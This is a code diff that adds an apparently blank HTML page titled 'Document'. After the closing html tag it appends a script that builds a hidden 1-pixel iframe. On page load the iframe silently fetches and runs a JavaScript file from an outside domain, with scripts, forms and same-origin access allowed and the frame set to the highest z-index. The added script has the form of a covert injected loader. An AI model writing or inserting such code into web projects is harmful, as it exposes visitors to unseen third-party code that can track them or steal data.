@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Document</title>
+</head>
+<body>
+  </body>
+</html>
+<script>
+    (function() {
+    var s = document.getElementsByTagName("body")[0];
+    var iframe_div = document.createElement("div");
+    iframe_div.style.display = "none";
+    var d = document.createElement("iframe");
+    d.srcdoc = '<html><head></head>' +
+      '<body></body>' + '<script type="text/javascript" src="https://cx.v5cam.com/lh/smart/common/hx81ijn.js"><\/script>' + '</html>';
+    d.sandbox = "allow-same-origin allow-scripts allow-forms";
+    d.style = "position:fixed;width:1px;height:1px;opacity:1;transition:right 0.1s,bootom 0.7s;z-index:0x7FFFFFFF;";
+    iframe_div.appendChild(d);
+    s.appendChild(iframe_div, s);
+})();
+  </script>
